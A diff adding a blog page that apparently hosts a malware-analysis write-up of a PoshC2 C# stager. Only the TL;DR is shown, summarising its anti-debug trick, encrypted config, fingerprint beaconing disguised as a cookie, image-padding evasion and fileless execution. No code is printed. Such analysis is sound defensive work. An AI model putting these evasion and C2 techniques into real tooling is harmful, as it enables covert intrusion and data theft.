@@ -1,0 +1,1571 @@
+<!doctype html>
+<html
+  lang="en-us"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/bubka/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=bubka/livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en-us">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Dropper-cs.exe analysis &middot; bubka hacks stuff</title>
+    <meta name="title" content="Dropper-cs.exe analysis &middot; bubka hacks stuff">
+  
+
+  
+  
+    <meta name="description" content="`dropper_cs.exe` — PoshC2 C# implant. AES-encrypted config, HTTPS beacon to `192.168.248.128`, fileless in-memory execution, anti-debug via divide-by-zero.">
+  
+  
+    <meta name="keywords" content="Malware Analysis,Reverse Engineering,Windows,PE,.NET,dnspy,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/bubka/writeups/dropper-cs.exe-analysis/">
+  
+
+  
+  
+    <meta name="author" content="Bubka">
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/bubka/writeups/dropper-cs.exe-analysis/">
+  <meta property="og:site_name" content="bubka hacks stuff">
+  <meta property="og:title" content="Dropper-cs.exe analysis">
+  <meta property="og:description" content="dropper_cs.exe — PoshC2 C# implant. AES-encrypted config, HTTPS beacon to 192.168.248.128, fileless in-memory execution, anti-debug via divide-by-zero.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-11-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-23T00:00:00+00:00">
+    <meta property="article:tag" content="Malware Analysis">
+    <meta property="article:tag" content="Reverse Engineering">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="PE">
+    <meta property="article:tag" content=".NET">
+    <meta property="article:tag" content="Dnspy">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Dropper-cs.exe analysis">
+  <meta name="twitter:description" content="dropper_cs.exe — PoshC2 C# implant. AES-encrypted config, HTTPS beacon to 192.168.248.128, fileless in-memory execution, anti-debug via divide-by-zero.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/bubka/css/main.bundle.min.5c15dc62a6c195e7ffd42b3182115b94052ac03dfca8349699a116dccaf99d81d5082b4a48c8a951c816376427b708c81ae5e003429a615a8f12ea9c48bec489.css"
+    integrity="sha512-XBXcYqbBlef/1CsxghFblAUqwD38qDSWmaEW3Mr5nYHVCCtKSMipUcgWN2QntwjIGuXgA0KaYVqPEuqcSL7EiQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/bubka/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/bubka/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/bubka/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
+      integrity="sha512-Z2JKNXySjSm5/hm6AaHjLAWtEynKKnEr8QRG3wxocpA9DBSyH3aJa1eloHEJQIBUFs7jiFHZBn22VViBGI41pQ=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+<script src="/bubka/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/bubka/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/bubka/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/bubka/favicon-16x16.png">
+    <link rel="manifest" href="/bubka/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "",
+    "name": "Dropper-cs.exe analysis",
+    "headline": "Dropper-cs.exe analysis",
+    
+    "inLanguage": "en-us",
+    "url" : "http://localhost:1313/bubka/writeups/dropper-cs.exe-analysis/",
+    "author" : {
+      "@type": "Person",
+      "name": "Bubka"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-11-23T00:00:00\u002b00:00",
+    "datePublished": "2025-11-23T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-11-23T00:00:00\u002b00:00",
+    
+    "keywords": ["Malware Analysis","Reverse Engineering","Windows","PE",".NET","dnspy"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1874"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
+  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
+    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/bubka/" class="text-base font-medium truncate min-w-0 shrink">
+      bubka hacks stuff
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/bubka/writeups/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="investigations "
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          investigations
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/bubka/blue_team/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="blue team"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          blue team
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/bubka/writeups/"
+        aria-label="investigations "
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          investigations
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/bubka/blue_team/"
+        aria-label="blue team"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          blue team
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/bubka/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+    
+    
+  
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/bubka/mountains1_hu_a2994e7dd6907ddb.jpg"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/bubka/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/bubka/mountains1_hu_a2994e7dd6907ddb.jpg"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Dropper-cs.exe analysis
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-11-23T00:00:00&#43;00:00">November 23, 2025</time>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/malware-analysis/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Malware Analysis
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/reverse-engineering/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Reverse Engineering
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/windows/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Windows
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/pe/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    PE
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/.net/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    .NET
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/dnspy/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Dnspy
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600 text-sm">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span>TL;DR</span></a></li>
+        <li><a href="#initial-analysis"><span>initial analysis</span></a>
+          <ul>
+            <li><a href="#libraries">libraries</a></li>
+            <li><a href="#imports">imports</a></li>
+            <li><a href="#strings">strings</a></li>
+            <li><a href="#running-in-sandbox">running in Sandbox</a></li>
+          </ul>
+        </li>
+        <li><a href="#reversing-in-dnspy"><span>reversing in DNSpy</span></a>
+          <ul>
+            <li><a href="#anti-analysis">anti-analysis</a></li>
+            <li><a href="#config-decryption-result">config decryption result</a></li>
+            <li><a href="#init--stage--commandloop-analysis">Init() → Stage() → CommandLoop() analysis</a></li>
+            <li><a href="#c2-communication-layer">C2 communication layer</a></li>
+            <li><a href="#steganographic-payload-padding">Steganographic payload padding</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span>TL;DR</span></a></li>
+        <li><a href="#initial-analysis"><span>initial analysis</span></a>
+          <ul>
+            <li><a href="#libraries">libraries</a></li>
+            <li><a href="#imports">imports</a></li>
+            <li><a href="#strings">strings</a></li>
+            <li><a href="#running-in-sandbox">running in Sandbox</a></li>
+          </ul>
+        </li>
+        <li><a href="#reversing-in-dnspy"><span>reversing in DNSpy</span></a>
+          <ul>
+            <li><a href="#anti-analysis">anti-analysis</a></li>
+            <li><a href="#config-decryption-result">config decryption result</a></li>
+            <li><a href="#init--stage--commandloop-analysis">Init() → Stage() → CommandLoop() analysis</a></li>
+            <li><a href="#c2-communication-layer">C2 communication layer</a></li>
+            <li><a href="#steganographic-payload-padding">Steganographic payload padding</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h3 class="relative group"><span style="color:lightblue">TL;DR</span>
+    <div id="tldr" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#tldr" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p><code>dropper_cs.exe</code> is a <strong>PoshC2 C# implant (stager)</strong> that establishes a persistent encrypted C2 channel over HTTPS.</p>
+<p>On execution the sample immediately hides its console window and uses a deliberate divide-by-zero exception as an anti-debug technique — real execution flow lives inside the catch block, invisible to a debugger. An AES-encrypted C2 configuration is embedded directly in the binary as a reversed base64 string, decrypted at runtime to reveal the C2 address, beacon interval, session key, and URI pattern.</p>
+<p>The implant contacts <code>192.168.248.128:443</code> within 1.3 seconds of startup, sending an AES-encrypted system fingerprint (username, domain, PID, architecture) disguised as a <code>SessionID</code> cookie. Outbound data is padded with real image bytes to evade network inspection. All communication is encrypted with AES-CBC and SSL validation is disabled to allow self-signed certificates.</p>
+<p>Once staging completes, the implant enters an indefinite beacon loop (<code>KillDate: 2999-01-01</code>), polling the C2 every 5 seconds ±20% jitter for commands. It supports 13+ commands including in-memory assembly execution, live reconfiguration, modular payload loading via <code>Stage2-Core.exe</code>, and named pipe communication for lateral movement. All operations are fileless — nothing is written to disk.</p>
